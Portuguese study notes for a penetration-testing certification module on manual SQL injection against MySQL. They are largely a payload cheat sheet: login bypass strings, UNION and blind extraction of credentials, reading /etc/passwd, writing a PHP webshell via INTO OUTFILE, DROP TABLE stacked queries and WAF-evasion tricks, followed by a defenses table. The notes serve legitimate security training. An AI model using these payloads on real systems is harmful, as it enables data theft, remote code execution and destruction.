---
tema: Web / Injeção
tópico: SQL Injection Fundamentals — exploração manual in-band, blind e escrita de arquivo
tags: [htb, cpts, sqli, mysql, sql-injection, web]
dificuldade: medium
---

# 💉 CPTS 17 — SQL Injection Fundamentals

> [!info] Objetivo
> Explorar injeção de SQL **à mão**: identificar o ponto, descobrir o tipo (UNION, erro, blind boolean/time), extrair dados, ler/escrever arquivos no servidor e reconhecer as defesas. O sqlmap vem depois — só automação do que você já entendeu.

---

## 🎯 Quando usar

| Cenário | Ponto de injeção |
|---------|------------------|
| Login/registro | Campos de usuário, e-mail, senha |
| Busca e filtros | `?id=`, `?category=`, `?order=`, `?sort=` |
| Parâmetros ocultos | Campos em JSON/POST que o front não mostra |
| Cookies e headers | `Cookie:`, `X-Forwarded-For`, `User-Agent` (menos comum) |
| APIs REST | Path params (`/user/1`) e corpos JSON |
| Nunca | Onde não há query dinâmica (arquivo estático) |

---

## 🧰 Ferramentas

| Ferramenta | Papel |
|-----------|-------|
| Burp Suite (Repeater/Intruder) | Enviar payloads, comparar respostas, medir tempo |
| `curl` | Testes rápidos fora do browser |
| Navegador + DevTools | Ver o que o form realmente envia |
| `sqlmap` | Automatizar após confirmar manualmente ([[CPTS 18 - SQLMap Essentials]]) |
| `gobuster`/ffuf + dicionário | Achar parâmetros escondidos (`SecLists/Discovery/Web-Content/burp-parameter-names.txt`) |

---

## 🐬 MySQL essencial

```sql
-- Funções de reconhecimento úteis em payloads
SELECT version();          -- 8.0.x
SELECT database();         -- banco atual
SELECT user();             -- usuario@host da conexão
SELECT @@version;          -- mesma coisa, variável de sistema
SELECT @@hostname;         -- nome do host (bom para identificar container)
SELECT system_user();      -- usuário de SO associado
SELECT current_user();
```

| Metadado | Onde vive |
|----------|-----------|
| Bancos | `information_schema.schemata.schema_name` |
| Tabelas | `information_schema.tables.table_name` |
| Colunas | `information_schema.columns.column_name` |
| Privilégios | `information_schema.user_privileges` |

```sql
SHOW DATABASES;
SHOW TABLES;
DESCRIBE users;                     -- colunas e tipos
SELECT * FROM users LIMIT 3;
SELECT username, password FROM users;
```

### Comentários e quebra de sintaxe

| Sintaxe | Banco |
|---------|-------|
| `-- -` (com espaço) | MySQL, MSSQL, Postgres |
| `#` | MySQL |
| `/* */` | Quase todos (também serve para bypass de filtro) |
| `;-- -` | Permite statement extra (stacked) |

```sql
'        -- quebra a string; erro de sintaxe = ponto de injeção provável
''       -- string vazia válida
```

---

## 🔍 Detecção e classificação

### Passo 1 — provocar erro

Envie `'`, `"`, `')`, `'))`, `"` e compare:

| Resposta | Leitura |
|----------|---------|
| Erro de SQL (500, stacktrace, "You have an error in your SQL syntax") | Injeção **error-based** viável |
| Conteúdo some ou muda | Query quebrada — provável injeção |
| Mesma página, sem erro | Ou não injeta, ou é blind |
| Página personalizada "erro interno" | Verifique se um payload válido volta ao normal |

### Passo 2 — provar que o parâmetro controla a query

```sql
-- Lógica verdadeira → resultado normal
1' AND '1'='1
1 AND 1=1
-- Lógica falsa → resultado vazio/diferente
1' AND '1'='2
1 AND 1=2
```

```sql
-- Aritmética: se 2 responde igual ao original, houve avaliação numérica
1+1        -- ?id=2-1 resolve para 1 quando a query é numérica
```

### Passo 3 — classificar

| Tipo | Sinal | Técnica |
|------|-------|---------|
| In-band UNION | Resultado aparece na página | Mais rápido e limpo |
| In-band erro | Conteúdo aparece dentro do erro | `extractvalue`/`updatexml` |
| Blind booleano | Página muda com verdadeiro/falso | Perguntas sim/não |
| Blind tempo | Só o tempo muda | `SLEEP()`, `BENCHMARK()` |
| Out-of-band | Nada volta na resposta | DNS/HTTP para servidor externo |

---

## 🚪 Bypass de autenticação

Query típica: `SELECT * FROM users WHERE username='$u' AND password='$p' LIMIT 1`.

| Payload (usuário) | Efeito |
|-------------------|--------|
| `admin'-- -` | Comenta o resto: ignora a senha |
| `admin'#` | Idem, comentário MySQL |
| `' OR 1=1-- -` | Retorna a primeira linha da tabela (geralmente admin) |
| `' OR '1'='1'-- -` | Mesma ideia com strings |
| `' OR 1=1 LIMIT 1-- -` | Garante uma única linha |
| `admin' OR '1'='1'#` | Variante com comentário curto |
| `' OR 1=1 ORDER BY id LIMIT 1-- -` | Escolhe explicitamente o admin |

```bash
# Teste rápido no form de login (substitua o corpo conforme o DevTools)
curl -s http://<IP>/login.php -d "username=admin'-- -&password=x" | grep -i welcome
```

> [!tip] Sempre comece por aqui
> Auth bypass entrega acesso sem precisar dumpar o banco. Se o objetivo é só entrar, esse é o caminho mais barato.

---

## 🧩 UNION-based (in-band)

### Passo 1 — descobrir o número de colunas

```sql
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -   -- erro? então são 2 colunas
```

Alternativa: ir somando NULLs até parar de dar erro.

```sql
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL-- -
```

### Passo 2 — achar colunas que aparecem na página

```sql
' UNION SELECT 1,2,3-- -
' UNION SELECT 'a','b','c'-- -
```

As colunas cujo valor aparece na resposta são as usadas para extrair dados. Se a query original retorna strings, use strings; se números, números (evita erro de tipo).

### Passo 3 — extração em cadeia

```sql
-- Contexto
' UNION SELECT 1,database(),version()-- -
' UNION SELECT 1,user(),@@datadir-- -

-- Bancos
' UNION SELECT 1,group_concat(schema_name),3 FROM information_schema.schemata-- -

-- Tabelas do banco atual
' UNION SELECT 1,group_concat(table_name),3
  FROM information_schema.tables WHERE table_schema=database()-- -

-- Colunas de uma tabela
' UNION SELECT 1,group_concat(column_name),3
  FROM information_schema.columns WHERE table_name='users'-- -

-- Dump: 0x3a é ':' (evita problema de aspas no payload)
' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users-- -

-- Contornar o limite de tamanho do group_concat
' UNION SELECT 1,group_concat(concat(username,0x3a,password) SEPARATOR '<br>'),3 FROM users-- -
```

| Truque | Por quê |
|--------|---------|
| `group_concat()` | Junta várias linhas em uma só |
| `0x3a` / `0x2d` | Hex para `:` e `-` sem usar aspas |
| `LIMIT 1 OFFSET 1` | Pagina resultados quando `group_concat` trunca |
| `concat_ws()` | Junta colunas com separador |
| `@@version_comment` | Identifica build/distro do MySQL |

---

## ⚠️ Error-based

Quando o erro é impresso na resposta, dá para refletir dados dentro dele.

```sql
' AND extractvalue(1,concat(0x7e,(SELECT database())))-- -
' AND updatexml(1,concat(0x7e,(SELECT version())),1)-- -
' AND updatexml(1,concat(0x7e,(SELECT substring(group_concat(table_name),1,32)
    FROM information_schema.tables WHERE table_schema=database())),1)-- -
```

| Função | Limite |
|--------|--------|
| `extractvalue()` | ~32 caracteres por chamada — fatie com `substring()` |
| `updatexml()` | Mesmo limite; terceiro argumento é XPath obrigatório |
| `floor(rand(0)*2)` em `GROUP BY` | Erro de chave duplicada, funciona em versões antigas |

> [!note] MySQL 8
> `extractvalue`/`updatexml` foram removidas em versões recentes em alguns builds. Se falharem, vá para blind.

---

## 🕳️ Blind boolean

Cada pergunta = uma requisição. Extraia caractere por caractere.

```sql
-- Testar se o banco começa com 'a'
' AND SUBSTRING(database(),1,1)='a'-- -
' AND ASCII(SUBSTRING(database(),1,1))=97-- -

-- Comparação por faixa (busca binária: ~7 requisições por caractere)
' AND ASCII(SUBSTRING(database(),1,1))>100-- -

-- Pergunta sobre existência de dado
' AND (SELECT 'x' FROM users WHERE username='admin')='x'-- -
' AND (SELECT LENGTH(password) FROM users WHERE username='admin')>20-- -
```

| Truque | Efeito |
|--------|--------|
| Busca binária (`>` `<`) | 7 requisições/byte em vez de 95 |
| `LIKE 'a%'` | Testa prefixo sem conhecer o comprimento |
| `LENGTH()` | Determina antes quantos caracteres extrair |
| `ASCII()`/`ORD()` | Evita problemas com aspas e charset |
| `substring(x,n,1)` | Fatiar strings longas |

Automatize a comparação com script Python (`requests`) medindo diferença de corpo/tamanho — ou deixe para o sqlmap depois de provar o ponto.

---

## ⏱️ Blind time-based

```sql
' AND SLEEP(5)-- -
' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)-- -
' AND (SELECT 1 FROM (SELECT SLEEP(5))x)-- -
' AND BENCHMARK(10000000,SHA1('a'))-- -
' OR IF(1=1,SLEEP(5),0)-- -
```

| Banco | Atraso |
|-------|--------|
| MySQL | `SLEEP(5)`, `BENCHMARK(n,expr)` |
| MSSQL | `WAITFOR DELAY '0:0:5'` |
| PostgreSQL | `pg_sleep(5)` |
| Oracle | `dbms_pipe.receive_message(('a'),5)` |

> [!warning] Baseline primeiro
> Meça o tempo normal de resposta 3×. Sem baseline, uma query lenta no servidor vira falso positivo. Use atraso ≥ 3s e repita a confirmação.

---

## 📂 Ler e escrever arquivos (MySQL)

### Ler

```sql
' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3-- -
' UNION SELECT 1,LOAD_FILE('/var/www/html/config.php'),3-- -
```

### Escrever (webshell)

```sql
' UNION SELECT "<?php system($_GET['c']);?>",2,3
  INTO OUTFILE '/var/www/html/shell.php'-- -

-- DUMPFILE escreve sem formatar/separar linhas (melhor para binário e shell puro)
' UNION SELECT "<?php system($_GET['c']);?>",2,3
  INTO DUMPFILE '/var/www/html/shell.php'-- -
```

| Pré-requisito | Como verificar |
|---------------|----------------|
| Privilégio `FILE` | `' UNION SELECT 1,grantee,privilege_type FROM information_schema.user_privileges-- -` |
| `secure_file_priv` | `SHOW VARIABLES LIKE 'secure_file_priv';` — vazio = qualquer path; `NULL` = bloqueado |
| Diretório gravável pelo usuário do mysqld | Descobrir o docroot (`@@datadir`, erro de caminho, `apache2.conf` via LFI) |
| `FILE` no `mysql.user` | `SELECT CURRENT_USER()` e conferir privilégios |

> [!danger] Escrita de arquivo é destrutiva
> `INTO OUTFILE` **não sobrescreve** arquivo existente — se falhar, escolha outro nome. Confirme autorização por escrito antes de gravar webshell.

---

## 🧱 Stacked queries

```sql
'; DROP TABLE users;-- -          -- MSSQL/Postgres costumam aceitar
'; INSERT INTO users VALUES('hacker','hash','admin');-- -
'; UPDATE users SET password='x' WHERE username='admin';-- -
```

| Stack | Suporte |
|-------|---------|
| MSSQL | Sim, quase sempre |
| PostgreSQL | Sim (via `psql`/driver com multi-statement) |
| MySQL | Só com `multi_query` (mysqli/PDO emulado) — geralmente **não** |

> [!note] Quando não há stacked
> Sem segundo statement não existe `INSERT`/`DROP`. Nesse caso, o impacto fica em leitura (dados, hashes) e escrita de arquivo — o suficiente para capturar credenciais e escalar.

---

## 🛡️ Bypass de filtros e WAF

| Situação | Payload |
|----------|---------|
| Espaço bloqueado | `/**/`, `%09`, `%0a`, `()`, `+` |
| `UNION` bloqueado | `UnIoN`, `UN/**/ION`, `/*!50000UNION*/` |
| `SELECT` bloqueado | `SEL/**/ECT`, `%53ELECT` |
| Aspas bloqueadas | `0x61646d696e` (hex), `CHAR(97,100,109,105,110)` |
| `AND`/`OR` bloqueados | `&&`, `\|\|`, `%26%26` |
| Comentários filtrados | Use espaços e `;%00` conforme o banco |
| Case-sensitive filter | Alterne o caso de todas as keywords |
| `information_schema` bloqueado | `sys.schema_table_statistics` (MySQL 8) ou inferência por erro/blind |

```sql
-- Exemplo combinando bypass
1'/**/UNION/**/SELECT/**/1,group_concat(table_name),3/**/FROM/**/information_schema.tables-- -
```

> [!tip] Codificação
> Double-URL-encode (`%2527`) e case mixing derrotam filtros ingênuos. Se a WAF normaliza, o bypass precisa ser estrutural (hex, comentários), não apenas percentual.

---

## ⚔️ Transição para sqlmap

Depois de provar o ponto manualmente:

```bash
# Request salva do Burp (método POST, cookie, headers)
sqlmap -r req.txt --batch -p id --dbms=mysql --level=5 --risk=2
sqlmap -r req.txt -D <BANCO> -T users --dump --batch
```

Vantagens de saber manual: você escolhe `--technique`, identifica falso positivo do "todos os parâmetros são injetáveis" e explica o impacto no relatório. Detalhes em [[CPTS 18 - SQLMap Essentials]].

---

## 🛡️ Defesas (para o relatório)

| Defesa | Como funciona |
|--------|---------------|
| Prepared statements | Query e dados separados — o dado nunca é parseado como SQL |
| ORM com binding | Mesmo princípio, cuidado com `raw()`/concatenação |
| Escape de entrada | Paliativo; falha com charset/contexto errado |
| Validação por allowlist | `?sort=` só aceita colunas conhecidas |
| Usuário de BD com menor privilégio | Sem `FILE`, sem `DROP` |
| Erro genérico ao cliente | Remove error-based |
| WAF | Bloqueia automação, não a lógica |
| `secure_file_priv` | Impede `LOAD_FILE`/`OUTFILE` |

Sempre recomende a **correção estrutural** (parametrização) e cite o impacto: dump de PII, bypass de autenticação, RCE via webshell.

---

## ⚠️ Pegadinhas

- `'` sem espaço antes do comentário (`'-- -` vs `'--`) quebra a sintaxe no MySQL: `--` exige espaço depois.
- Union com número de colunas errado gera erro que parece "não injetável".
- Tipos importam: `NULL` funciona em qualquer coluna; string em coluna numérica não.
- `Load_file` falha silenciosamente (retorna NULL) sem privilégio `FILE` — não é "coluna errada".
- `secure_file_priv=NULL` significa bloqueado; string vazia significa liberado. Ler antes de gravar.
- Blind boolean com corpo dinâmico (token/CSRF) gera falso positivo — compare com baseline.
- Time-based sem baseline medido = ruído.
- `group_concat` trunca em `group_concat_max_len` (default 1024) — paginar com `LIMIT/OFFSET` ou `SET SESSION`.
- Não confundir falha de WAF com ausência de injeção: teste com payload mutado.

---

## ✅ Checklist rápido

- [ ] Parâmetro confirmado como ponto de injeção (`AND 1=1` vs `AND 1=2`)
- [ ] Tipo classificado (UNION / erro / blind bool / blind time)
- [ ] Bypass de autenticação testado primeiro
- [ ] Nº de colunas descoberto (`ORDER BY` / `UNION SELECT NULL`)
- [ ] Colunas refletidas identificadas
- [ ] Banco/usuário/versão coletados
- [ ] Tabelas e colunas via `information_schema`
- [ ] Dados sensíveis extraídos (usuários, hashes, tokens)
- [ ] Privilégio `FILE` e `secure_file_priv` checados
- [ ] Leitura de arquivo testada (`/etc/passwd`, config)
- [ ] SQLi documentada com request/response e impacto
- [ ] Recomendação de defesa registrada

---

## 🔗 Relacionado

- [[CPTS 18 - SQLMap Essentials]]
- [[CPTS 15 - Attacking Web Applications with Ffuf]]
- [[CPTS 14 - Using Web Proxies]]
- [[CPTS 23 - Web Attacks]]
- [[Fase 06 - Vulnerabilidade e Exploração]]
